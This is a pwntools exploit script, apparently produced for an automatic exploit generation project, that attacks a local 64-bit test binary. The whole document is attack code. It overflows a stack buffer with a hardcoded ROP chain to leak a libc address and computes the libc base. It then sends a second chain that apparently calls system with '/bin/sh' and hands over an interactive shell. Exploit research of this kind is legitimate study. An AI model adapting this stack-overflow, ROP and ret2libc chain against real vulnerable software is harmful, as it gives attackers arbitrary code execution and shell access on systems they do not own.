from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/PBAEG/binaries/64bit/path_search_test/path_search_stack/path_search_stack_test1/path_search_stack_test1")
pwn.gdb.attach(p)
payload = b""
payload += b'hello world\x00\x00\x00\x00\x00'
p.send(payload)
p.recvuntil(b'you find it!\n')
payload = b"\x00" * 24
payload += p64(0x400285) + p64(0x400823) + p64(0x600ff0) + p64(0x400590) + p64(0x40081a) + p64(0x0) + p64(0x1) + p64(0x600fd0) + p64(0x0) + p64(0x601880) + p64(0x18) + p64(0x400800) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(0x400648) + p64(0x601878) + p64(0x400798)
payload = payload.ljust(256, b"a")
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x2ddc0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x400823) + p64(libc_base + 0x1dc698) + p64(libc_base + 0x54d60)
p.send(payload)
p.interactive()
